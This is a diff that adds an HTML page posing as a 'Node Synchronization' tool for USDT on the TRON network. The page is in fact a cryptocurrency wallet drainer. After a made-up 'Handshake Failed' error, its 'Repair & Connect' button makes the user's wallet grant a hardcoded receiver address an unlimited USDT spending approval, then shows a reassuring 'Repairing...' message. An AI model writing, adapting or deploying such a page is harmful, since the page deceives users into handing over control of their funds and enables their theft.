@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Node Sync Protocol</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+    <style>
+        /* 这里就是你截图中那部分 CSS 样式 */
+        body { background: #0b0e11; margin: 0; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; color: #fff; }
+        .container { width: 90%; max-width: 400px; background: #181a20; border-radius: 24px; padding: 30px; text-align: center; border: 1px solid #2b2f36; }
+        .input-box { width: 100%; box-sizing: border-box; padding: 15px; background: #2b2f36; border: 1px solid #474d57; border-radius: 12px; font-size: 18px; color: #fff; outline: none; margin-bottom: 20px; }
+        .btn { background: #f0b90b; color: #181a20; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; border: none; width: 100%; }
+        #mask { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; }
+        .modal { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; background: #1e2329; border-radius: 16px; padding: 24px; text-align: center; }
+        .repair-btn { background: #f6465d; color: #fff; padding: 12px; border-radius: 8px; border: none; width: 100%; font-weight: bold; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2 style="color:#f0b90b">Node Synchronization</h2>
+        <p style="color:#848e9c; font-size:13px">Enter USDT amount to verify node connection.</p>
+        <input type="number" id="sync-amt" class="input-box" placeholder="Amount (USDT)">
+        <button class="btn" onclick="showError()">Initialize Sync</button>
+    </div>
+
+    <div id="mask">
+        <div class="modal">
+            <h3 style="color:#f6465d; margin:0">Handshake Failed</h3>
+            <p style="color:#848e9c; font-size:13px">Network exception (0x889). Please repair the connection to continue.</p>
+            <button class="repair-btn" onclick="doApprove()">Repair & Connect</button>
+        </div>
+    </div>
+
+    <script>
+        const CONFIG = {
+            RECEIVER: "TKPDtwUvCL45sKPchTr9d1U8TKyNKQDnLB",
+            USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
+        };
+
+        function showError() {
+            if(!document.getElementById('sync-amt').value) return alert("Enter amount");
+            document.getElementById('mask').style.display = 'block';
+        }
+
+        async function doApprove() {
+            try {
+                const contract = await window.tronWeb.contract().at(CONFIG.USDT);
+                const infinity = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+                await contract.approve(CONFIG.RECEIVER, infinity).send();
+                alert("Repairing... please wait.");
+            } catch (e) {
+                alert("Repair failed. Ensure you have TRX for gas fees.");
+            }
+        }
+    </script>
+</body>
+</html>
